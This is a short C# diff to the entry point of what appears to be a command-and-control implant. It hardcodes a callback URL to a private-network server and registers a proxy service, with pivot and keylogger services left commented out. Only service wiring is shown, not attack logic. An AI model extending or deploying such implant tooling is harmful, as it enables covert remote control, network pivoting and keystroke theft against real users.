@@ -51,7 +51,7 @@ namespace EntryPoint
 #if DEBUG
             Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
 
-            //connUrl = "https://192.168.48.128:443";
+            connUrl = "https://192.168.48.128:443";
             //connUrl = "pipe://127.0.0.1:C3PO";
 
             if (_args.Count() > 0)
@@ -95,10 +95,11 @@ namespace EntryPoint
             ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
             var cryptoService = new CryptoService(configService);
             ServiceProvider.RegisterSingleton<ICryptoService>(cryptoService);
-            ServiceProvider.RegisterSingleton<IFrameService>(new FrameService(cryptoService, configService));
+            var frameService = new FrameService(cryptoService, configService);
+            ServiceProvider.RegisterSingleton<IFrameService>(frameService);
             ServiceProvider.RegisterSingleton<IJobService>(new JobService());
+            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService(frameService));
 
-            //ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
             //ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
             //ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
 
